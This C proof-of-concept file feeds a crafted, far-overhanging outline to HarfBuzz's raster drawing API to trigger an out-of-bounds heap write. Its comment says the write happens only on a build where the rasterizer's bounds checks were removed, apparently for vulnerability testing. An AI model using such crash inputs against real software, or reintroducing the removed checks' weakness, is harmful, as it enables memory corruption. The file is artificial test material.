/* PoC: heap-buffer-overflow in the HarfBuzz raster analytic rasterizer.
 *
 * Drives the public hb_raster_draw API with a small fixed surface and a
 * closed outline whose first edge enters the surface on the left but
 * extends far past the right edge.  On the resulting tree the edge-sweep
 * fast path is entered on the strength of the entry column alone and the
 * per-cell column bound in cell_add has been dropped, so the unclipped
 * column walk writes area[col]/cover[col] far beyond the width-sized
 * scratch row, aborting under AddressSanitizer.
 *
 * On the original batch either defence still holds (the fast path checks
 * both endpoints, or cell_add clamps the column), so the sweep stays in
 * bounds and the program exits cleanly.
 */

#include <hb.h>
#include <hb-raster.h>

#include <stdio.h>

int main (void)
{
  hb_raster_draw_t *draw = hb_raster_draw_create_or_fail ();
  if (!draw)
    return 2;

  /* Small 8x8 A8 surface anchored at the origin. */
  hb_raster_extents_t ext = { 0, 0, 8u, 8u, 0u };
  hb_raster_draw_set_extents (draw, &ext);

  hb_draw_funcs_t *funcs = hb_raster_draw_get_funcs (draw);
  hb_draw_state_t st = HB_DRAW_STATE_DEFAULT;

  /* A thin sliver whose first edge starts inside the surface (x=0.5) and
   * runs far to the right (x=5000), crossing a single pixel row. */
  hb_draw_move_to (funcs, draw, &st, 0.5f, 4.0f);
  hb_draw_line_to (funcs, draw, &st, 5000.0f, 4.5f);
  hb_draw_line_to (funcs, draw, &st, 0.5f, 4.9f);
  hb_draw_close_path (funcs, draw, &st);

  hb_raster_image_t *image = hb_raster_draw_render (draw);

  /* Touch the result so nothing is optimized away. */
  if (image)
  {
    const uint8_t *buf = hb_raster_image_get_buffer (image);
    volatile uint8_t sink = buf ? buf[0] : 0;
    (void) sink;
    hb_raster_image_destroy (image);
  }

  hb_raster_draw_destroy (draw);
  printf ("done\n");
  return 0;
}
